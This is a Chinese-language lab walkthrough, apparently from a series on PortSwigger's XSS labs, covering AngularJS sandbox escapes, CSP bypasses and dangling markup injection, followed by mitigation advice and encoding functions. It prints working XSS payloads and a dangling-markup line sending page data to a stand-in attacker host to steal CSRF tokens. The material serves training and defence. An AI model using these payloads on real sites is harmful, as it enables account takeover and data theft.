### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFAngularJS%E6%B2%99%E7%AE%B1%EF%BC%9F"></a>什么是AngularJS沙箱？

AngularJS沙箱是一种防护机制，可以防止在AngularJS模板表达式中访问不安全的对象，如document和window，还有不安全的属性，如__proto__。近些年无数安全研究者开始研究如何绕过AngularJS沙箱，虽然该功能在AngularJS 1.6中被删掉了，但是还有大量的应用程序正在使用旧版本的AngularJS。

### <a class="reference-link" name="AngularJS%E6%B2%99%E7%AE%B1%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%90%E4%BD%9C%E7%9A%84%EF%BC%9F"></a>AngularJS沙箱是如何运作的？

沙箱的工作原理就是解析表达式，然后重写JS，再使用各种函数测试重写后是否还包含不安全的对象，例如ensureSafeObject()函数会检查指定对象是否引用了自己，可以用来检测window对象，同样适用于检测Function构造器。<br>
ensureSafeMemberName()函数会检查指定对象的所有属性，例如遇到__proto__ 或__lookupGetter__这类危险属性就会禁止该对象。ensureSafeFunction()函数可以禁止调用call()、apply()、bind()、constructor()函数。

### <a class="reference-link" name="AngularJS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%98%AF%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%9A%84%EF%BC%9F"></a>AngularJS沙箱逃逸是怎么实现的？

沙箱逃逸就是诱使沙箱引擎将恶意表达式识别为无害的。比较常见的逃逸手段就是在表达式中全局使用魔改过的charAt()函数，例如<br>`'a'.constructor.prototype.charAt=[].join`<br>
从上面来看，我们将charAt()函数重写成了[].join，即会返回所有输入的内容，而不是过滤后的。还有一个函数isIdent()，它可以将单个字符与多个字符相比，因为单个字符永远比多个字符少，所以可以导致它永远返回true。例如

```
isIdent= function(ch) `{`

return ('a' &lt;= ch &amp;&amp; ch &lt;= 'z' ||

'A' &lt;= ch &amp;&amp; ch &lt;= 'Z' ||

'_' === ch || ch === '$');

`}`

isIdent('x9=9a9l9e9r9t9(919)')
```

所以我们可以利用AngularJS的$eval()函数和魔改后的charAt()函数构造这样的payload以进行沙箱逃逸<br>`$eval('x=alert(1)')`

### <a class="reference-link" name="%E6%9E%84%E9%80%A0%E9%AB%98%E7%BA%A7%E7%9A%84AngularJS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"></a>构造高级的AngularJS沙箱逃逸

有的站点可能防护做的更好，就需要构造高级的沙箱逃逸，比如如果禁用了单或双引号就需要用String.fromCharCode()来构造。而且我们还可以用orderBy过滤器来代替$eval()来执行XSS payload，语法像这样的<br>`[123]|orderBy:'Some string'`<br>
在这里，这个符号(|)起到一个传递作用，把左边数组发到右边的过滤器的这么一个作用，冒号代表传递到过滤器的参数。这么讲可能不太直观，下面我们通过一道靶场来直观地讲解。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%B2%A1%E6%9C%89%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84AngularJS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场：没有字符串的AngularJS沙箱逃逸中的反射型XSS

我们先确定一下查询字符串的上下文

[![](https://p2.ssl.qhimg.com/t01e65036710cddaee7.png)](https://p2.ssl.qhimg.com/t01e65036710cddaee7.png)

前面提到了这里无法直接使用字符串和$eval()，所以我们需要结合上面介绍的沙箱逃逸手段来构造字符串。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c5bc216c05a04a1f.png)

这样我们就能成功实现沙箱逃逸并且触发XSS了

[![](https://p4.ssl.qhimg.com/t01ff32734ae7d38adf.png)](https://p4.ssl.qhimg.com/t01ff32734ae7d38adf.png)

### <a class="reference-link" name="%E7%BB%95%E8%BF%87AngularJS%20CSP%E6%98%AF%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%9A%84%EF%BC%9F"></a>绕过AngularJS CSP是如何实现的？

CSP全称content security policy，译为内容安全策略，我们在下一个小节就会讲到了。绕过CSP的原理与沙箱逃逸类似，但是绕过CSP会涉及一些HTML注入。CSP开启时会用不同方式解析表达式并且避免使用Function构造函数。那么上面讲过的沙箱逃逸手段就失效了。<br>
AngularJS定义了自己的事件以替代JS事件，在事件内部时，它定义了一个特殊的$event 对象，它只引用浏览器事件对象。可以用它来实现绕过CSP。在Chrome中，它有一个特殊的属性path，它包含了可以导致执行事件的对象数组。这个数组最后一个属性永远是window对象。我们可以将这个对象数组传递给过滤器，然后利用最后一个元素执行全局函数(如alert)。payload示例如下<br>`&lt;input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'"&gt;`<br>
这里的from函数可以将对象转换成数组，并将每个元素都调用给该函数第二个参数指定的函数。而且from函数还可以在沙箱中隐藏window对象以成功执行。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8AngularJS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%95%E8%BF%87CSP"></a>利用AngularJS沙箱逃逸绕过CSP

burp又加大了难度，限制了payload的长度，所以上述手段又失效了，我们需要换一种方法隐藏window对象。我们可以使用array.map()函数，payload示例如下<br>`[1].map(alert)`<br>
map()函数会将数组中每个元素都调用给参数指定的函数。因为没有引用window对象，所以这种方法是可行的。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9AAngularJS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%92%8CCSP%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场：AngularJS沙箱逃逸和CSP中的反射型XSS

因为既要沙箱逃逸又要绕过CSP，所以我们采用复合型payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01eaca1e9e2b48ca3b.png)

我们把payload做个URL解码看得比较直观

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018db85aab6d23d348.png)

我们看到了首先使用了$event对象的path对象绕过CSP，然后利用orderBy沙箱逃逸，成功触发XSS

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01abd54f608de84dcd.png)

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E7%BC%93%E8%A7%A3AngularJS%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%9F"></a>如何缓解AngularJS注入攻击？

想要缓解AngularJS注入攻击，需要避免使用不安全的用户输入作为模板或表达式。

### <a class="reference-link" name="%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5(Content%20security%20policy)"></a>内容安全策略(Content security policy)

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFCSP(Content%20security%20policy)%EF%BC%9F"></a>什么是CSP(Content security policy)？

CSP是一种浏览器安全机制，旨在缓解XSS攻击和一些其他攻击。它通过限制页面可以加载的资源以及限制页面是否可以被其他页面框架化的方式来进行防护。如果要启用CSP，需要在响应包头中加一个字段Content-Security-Policy，其中包括以分号间隔的指令。

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8CSP%E7%BC%93%E8%A7%A3XSS%E6%94%BB%E5%87%BB"></a>使用CSP缓解XSS攻击

CSP通过这样的指令限制只能加载与页面本身相同来源的资源<br>`script-src 'self'`<br>
通过下面的指令限制只能从指定域中加载资源<br>`script-src https://scripts.normal-website.com`<br>
但是这种允许外部域的做法还是有风险的，如果攻击者可以向其传递恶意脚本也会遭到攻击的。而且应该也同时不信任来自CDN的资源，因为也有被投放的风险。CSP还通过随机数和哈希值来指定可信资源。
- CSP的指令指定一个随机数，加载脚本的标签也必须有相同的随机数。否则就不执行该脚本。并秉持一次性的原则，避免被猜解。
- CSP指令可以指定脚本内容的哈希值。不匹配也是不会执行的。
虽然CSP通常可以阻止脚本，但是经常不会禁止加载图片资源，这就导致可以利用img标签窃取CSRF令牌。有些浏览器比如chrome，就有内置的悬空标记缓解功能，这个功能可以阻止包含某些字符的请求，比如换行符、未编码的新一行符或者尖括号。还有一些策略更为严格，可以防止所有形式的外部请求。但是还是可以通过注入一个HTML元素，点击该元素就会将该元素包含的所有内容发送到外部服务器的方式绕过这种策略。下面我们通过几道靶场来深入理解。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA1%EF%BC%9A%E5%88%A9%E7%94%A8%E6%82%AC%E6%8C%82%E6%A0%87%E8%AE%B0%E6%94%BB%E5%87%BB%E7%9A%84%E5%8F%97%E4%BF%9D%E6%8A%A4%E7%9A%84CSP%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场1：利用悬挂标记攻击的受保护的CSP中的反射型XSS

首先我们观察一下修改邮箱的表单要提交哪些信息

[![](https://p5.ssl.qhimg.com/t01387bd830f8dad219.png)](https://p5.ssl.qhimg.com/t01387bd830f8dad219.png)

我们现在要做的就是利用悬挂标记攻击将CSRF Token窃取出来，所以我们这样构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a78cb2b90aa7beea.png)

然后我们接收到这样的内容

[![](https://p0.ssl.qhimg.com/t01d3636ca84b672f5e.png)](https://p0.ssl.qhimg.com/t01d3636ca84b672f5e.png)

这里简单介绍一下悬挂标记攻击，就是利用标签必须闭合的特性，使用未闭合的标签将后面的内容全都包裹起来发送到目标服务器的这么一种攻击手段。现在我们获取到了一个有效的csrf令牌，然后我们利用burp的Engagement tools -&gt; Generate CSRF PoC功能生成CSRF页面，然后在Option中选中Include auto-submit script，重新生成一下，这样用户只需要点击链接就会自动发出请求。

[![](https://p1.ssl.qhimg.com/t01082a17d29fc82fce.png)](https://p1.ssl.qhimg.com/t01082a17d29fc82fce.png)

这样，当受害者接收到以后就会自动修改邮箱了

[![](https://p4.ssl.qhimg.com/t01d5e9ebd20991072c.png)](https://p4.ssl.qhimg.com/t01d5e9ebd20991072c.png)

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA2%EF%BC%9A%E5%88%A9%E7%94%A8%E6%82%AC%E6%8C%82%E6%A0%87%E8%AE%B0%E6%94%BB%E5%87%BB%E7%9A%84%E5%8F%97%E9%9D%9E%E5%B8%B8%E4%B8%A5%E6%A0%BC%E4%BF%9D%E6%8A%A4%E7%9A%84CSP%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场2：利用悬挂标记攻击的受非常严格保护的CSP中的反射型XSS

首先我们可以从响应包中看到当前CSP都开启了哪些策略

[![](https://p5.ssl.qhimg.com/t01245e4a6d0be19397.png)](https://p5.ssl.qhimg.com/t01245e4a6d0be19397.png)

所以这里我们只能使用HTML注入了

[![](https://p0.ssl.qhimg.com/t0123f5d8379c68c21f.png)](https://p0.ssl.qhimg.com/t0123f5d8379c68c21f.png)

又一次利用悬挂标记攻击窃取到CSRF令牌，然后用相同的办法触发CSRF

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bc375bf5986b549a.png)

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8CSP%E7%BC%93%E8%A7%A3%E6%82%AC%E6%8C%82%E6%A0%87%E8%AE%B0%E6%94%BB%E5%87%BB"></a>使用CSP缓解悬挂标记攻击

从上面来看，一般是采用img标签发动悬挂标记攻击，所以我们这样设置CSP策略

```
img-src 'self'
img-src https://images.normal-website.com
```

但是上述手段并不能阻止通过注入带有悬空href属性的锚点的方式发动的悬挂标记攻击。

### <a class="reference-link" name="%E9%80%9A%E8%BF%87%E7%AD%96%E7%95%A5%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87CSP"></a>通过策略注入绕过CSP

有些情况是我们可以注入一些我们自己的策略去覆盖原来的CSP策略指令。一般来讲是不可能覆盖掉指令script-src的，但是chrome引入了指令script-src-elem，可以控制脚本元素但不能控制事件。不过它可以覆盖掉指令script-src。

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E7%BB%95%E8%BF%87%E5%8F%97%E4%BF%9D%E6%8A%A4%E7%9A%84CSP%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"></a>配套靶场：绕过受保护的CSP中的反射型XSS

我们先看一下CSP策略

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016050ccdf2f075cb4.png)

发现最后一个指令report-uri是动态的，可以通过token值来添加新的CSP指令，所以我们这样构造payload

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b4427a033acaa679.png)

这样我们就又可以插入script，从而成功触发XSS了

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ab77e9b67fe5ac55.png)

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8CSP%E4%BF%9D%E6%8A%A4%E5%85%8D%E5%8F%97%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81%E6%94%BB%E5%87%BB"></a>使用CSP保护免受点击劫持攻击

点击劫持就是误导用户点击透明的按钮发出恶意请求，所以我们可以这样设置CSP策略

```
frame-ancestors 'self'
frame-ancestors 'none'
frame-ancestors 'self' https://normal-website.com https://*.robust-website.com
```

这种保护手段比X-Frame-Options要好，因为CSP会验证父框架下的每个子框架，而X-Frame-Options只验证顶级框架。不过也可以两者结合着用，因为IE不支持CSP。

### <a class="reference-link" name="%E6%82%AC%E6%8C%82%E6%A0%87%E8%AE%B0%E6%B3%A8%E5%85%A5"></a>悬挂标记注入

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AF%E6%82%AC%E6%8C%82%E6%A0%87%E8%AE%B0%E6%B3%A8%E5%85%A5%EF%BC%9F"></a>什么是悬挂标记注入？

悬挂标记注入是一种在无法进行完整XSS攻击的情况下捕获跨域数据的技术。我们来看这样一条代码<br>`&lt;input type="text" name="input" value="CONTROLLABLE DATA HERE`<br>
然后我们让这个标签提前闭合，然后后面跟上这样的语句<br>`"&gt;&lt;img src='//attacker-website.com?`<br>
我们看到这个img标签是没有闭合的，既然是没有闭合，它就会一直找下去，直到找到可以闭合的单引号为止，这样就会把后面的东西全都包裹到img标签中，然后因为src属性，会发出一个请求，而后面包裹进来的东西也会整体附在URL后面发出去，这样我们可能会得到很多我们想要的数据，比如CSRF Token之类的。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E7%BC%93%E8%A7%A3XSS%E6%94%BB%E5%87%BB%EF%BC%9F"></a>如何缓解XSS攻击？

### <a class="reference-link" name="%E5%B0%86%E8%BE%93%E5%87%BA%E6%95%B0%E6%8D%AE%E7%BC%96%E7%A0%81%E5%A4%84%E7%90%86"></a>将输出数据编码处理

在用户输入写入页面之前就应该执行编码操作，而且不同的上下文，编码方式不同，比如上下文为HTML时

```
&lt; 编码成 &amp;lt;
&gt; 编码成 &amp;gt;
```

上下文为JS时

```
&lt; 编码成 \u003c
&gt; 编码成 \u003e
```

有的时候还需要按顺序进行多层编码处理以防止出现像onclick事件的情况。

### <a class="reference-link" name="%E9%AA%8C%E8%AF%81%E8%BE%93%E5%85%A5"></a>验证输入

因为我们永远不知道用户输入有多奇葩，所以我们需要尽量严格地验证输入，比如采取这样的措施
- 如果响应会返回提交的URL，则验证是不是HTTP或HTTPS开头的
- 如果预期输入是数字，则验证输入是否为整数
- 验证输入中包含的字符是否均为允许的字符
### <a class="reference-link" name="%E7%99%BD%E5%90%8D%E5%8D%95%E8%BF%98%E6%98%AF%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%9F"></a>白名单还是黑名单？

一般情况下都会选择白名单，因为如果使用黑名单的话，永远不知道有没有遗漏，俗话说，宁可错杀一千不放过一个嘛。

### <a class="reference-link" name="%E5%85%81%E8%AE%B8%E5%AE%89%E5%85%A8%E7%9A%84HTML"></a>允许安全的HTML

应尽可能地限制使用HTML标记，应该过滤到有害的标签和JS，也可以引入一些执行过滤和编码的JS库，如DOMPurify。有些库还允许用户使用markdown来编写内容再渲染成HTML，但是这些库都不是绝对的安全，所以要及时更新。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%BC%93%E8%A7%A3XSS%E6%94%BB%E5%87%BB%EF%BC%9F"></a>如何使用模板引擎缓解XSS攻击？

有些网站使用Twig和Freemarker等服务器端模板引擎在HTML中嵌入动态内容，他们都有自己的过滤器，还有一些引擎，比如Jinja和React，它们默认情况下就会转义动态内容，一定程度上也会缓解XSS攻击。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E5%9C%A8PHP%E4%B8%AD%E7%BC%93%E8%A7%A3XSS%E6%94%BB%E5%87%BB%EF%BC%9F"></a>如何在PHP中缓解XSS攻击？

可以利用内置的HTML编码函数htmlentities，它有三个参数分别为
- 输入字符串
- ENT_QUOTES，编码所有引号标志
- 字符集，一般为UTF-8
用例如下<br>`&lt;?php echo htmlentities($input, ENT_QUOTES, 'UTF-8');?&gt;`<br>
但是PHP没有内置的针对JS编码的Unicode函数，但是burp给出了一个示例

```
&lt;?php

function jsEscape($str) `{`
  $output = '';
  $str = str_split($str);
  for($i=0;$i&lt;count($str);$i++) `{`
   $chrNum = ord($str[$i]);
   $chr = $str[$i];
   if($chrNum === 226) `{`
     if(isset($str[$i+1]) &amp;&amp; ord($str[$i+1]) === 128) `{`
       if(isset($str[$i+2]) &amp;&amp; ord($str[$i+2]) === 168) `{`
         $output .= '\u2028';
         $i += 2;
         continue;
       `}`
       if(isset($str[$i+2]) &amp;&amp; ord($str[$i+2]) === 169) `{`
         $output .= '\u2029';
         $i += 2;
         continue;
       `}`
     `}`
   `}`
   switch($chr) `{`
     case "'":
     case '"':
     case "\n";
     case "\r";
     case "&amp;";
     case "\\";
     case "&lt;":
     case "&gt;":
       $output .= sprintf("\\u%04x", $chrNum);
     break;
     default:
       $output .= $str[$i];
     break;
    `}`
  `}`
  return $output;
`}`
?&gt;
```

用例如下<br>`&lt;script&gt;x = '&lt;?php echo jsEscape($_GET['x'])?&gt;';&lt;/script&gt;`<br>
当然，也可以使用模板引擎。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E5%9C%A8%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%BC%93%E8%A7%A3JS%E4%B8%AD%E7%9A%84XSS%E6%94%BB%E5%87%BB%EF%BC%9F"></a>如何在客户端缓解JS中的XSS攻击？

JS既没有内置的HTML编码函数也没有内置的Unicode编码函数，但是burp依然给出了示例，首先是HTML编码函数

```
function htmlEncode(str)`{`
  return String(str).replace(/[^\w. ]/gi, function(c)`{`
     return '&amp;#'+c.charCodeAt(0)+';';
  `}`);
`}`
```

用例如下<br>`&lt;script&gt;document.body.innerHTML = htmlEncode(untrustedValue)&lt;/script&gt;`<br>
然后是Unicode编码函数

```
function jsEscape(str)`{`
  return String(str).replace(/[^\w. ]/gi, function(c)`{`
     return '\\u'+('0000'+c.charCodeAt(0).toString(16)).slice(-4);
  `}`);

`}`
```

用例如下<br>`&lt;script&gt;document.write('&lt;script&gt;x="'+jsEscape(untrustedValue)+'";&lt;\/script&gt;')&lt;/script&gt;`

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E5%9C%A8jQuery%E4%B8%AD%E7%BC%93%E8%A7%A3XSS%E6%94%BB%E5%87%BB%EF%BC%9F"></a>如何在jQuery中缓解XSS攻击？

jQuery通常因为使用location.hash处理输入然后传递给选择器而导致XSS。后面官方通过验证开头是否为哈希值的方式修复了这个漏洞。现在jQuery只会在第一个字符为&lt;时才会渲染HTML。不过还是建议使用jsEscape函数转义输入后再进行下一步操作。

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E5%9C%A8Java%E4%B8%AD%E7%BC%93%E8%A7%A3XSS%E6%94%BB%E5%87%BB%EF%BC%9F"></a>如何在Java中缓解XSS攻击？

使用字符白名单过滤用户输入，并使用Google Guava等库对HTML上下文的输出进行HTML编码，或对JS上下文使用Unicode转义。



## 总结

以上就是梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之客户端漏洞篇 – 跨站脚本(XSS)专题的全部内容啦，本专题主要讲了XSS漏洞的形成原理以及三种不同类型的XSS的区别，还有XSS的利用、防护、防护手段的绕过方法等，篇幅比较长，大家耐心观看哦。感兴趣的同学可以在评论区进行讨论，嘻嘻嘻。
